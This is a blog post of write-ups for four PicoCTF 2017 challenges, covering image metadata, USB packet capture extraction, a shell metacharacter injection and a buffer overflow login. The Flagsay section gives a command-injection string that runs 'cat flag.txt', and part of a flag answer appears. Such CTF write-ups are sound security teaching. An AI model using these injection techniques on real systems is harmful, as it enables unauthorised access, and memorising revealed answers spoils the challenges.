---
layout: post
title:  "Write up PicoCTF 2017 level 2"
categories: ctf
---

## [Forensics - 70] Meta Find Me

> Find the location of the flag in the image: [image.jpg](https://webshell2017.picoctf.com/static/88ab73fa4f74422fde83acb8773551c3/image.jpg).
Note: Latitude and longitude values are in degrees with no degree symbols,/direction letters, minutes, seconds, or periods.
They should only be digits. The flag is not just a set of coordinates - if you think that, keep looking!

* Use [exiftool](http://www.sno.phy.queensu.ca/~phil/exiftool/):

```bash
exiftool image.jpg
Comment: "Your flag is flag_2_meta_4_me_<lat>_<lon>_978a. Now find the GPS coordinates of this image! (Degrees only please)"
GPS Position: 70 deg 0' 0.00", 73 deg 0' 0.00"
```

## [Forensics - 80] Just Keyp Trying
> Here's an interesting capture of some data. But what exactly is this data? Take a look:
[data.pcap](https://webshell2017.picoctf.com/static/adbda0ec51a267c32beba4692c48dc1b/data.pcap)

* Dump "Leftover Data Capture" from data.pcap file:

```bash
tshark -r data.pcap -T fields -e usb.capdata -Y usb.capdata > data.pcap.txt
```

* Convert hex dump to binary:

```bash
xxd -r -ps data.pcap.txt > data.pcap.bin
```

* Show file information:

```bash
file data.pcap.bin
data.pcap.bin: Targa image data - Map - RLE 65536 x 65536 x 0
```

## [Binary exploitation - 80] Flagsay 1
> I heard you like flags, so now you can make your own! Exhilarating! Use [flagsay-1](https://webshell2017.picoctf.com/static/6dd190d2b0b1cc49fc207bf115052785/flagsay-1)! [Source](https://webshell2017.picoctf.com/static/6dd190d2b0b1cc49fc207bf115052785/flagsay-1.c).
Connect on shell2017.picoctf.com:41875.

Using Metacharater injections:

`FOOL"; cat flag.txt; echo "BAR`

## [Binary exploitation - 80] VR Gear Console
> Here's the VR gear admin console. See if you can figure out a way to log in.
The problem is found here: /problems/1444de144e0377e55e5c7fea042d7f01

Using buffer overflow to overwrite `accessLevel`

Username: `give-me-theshell!`

Password: `noway`

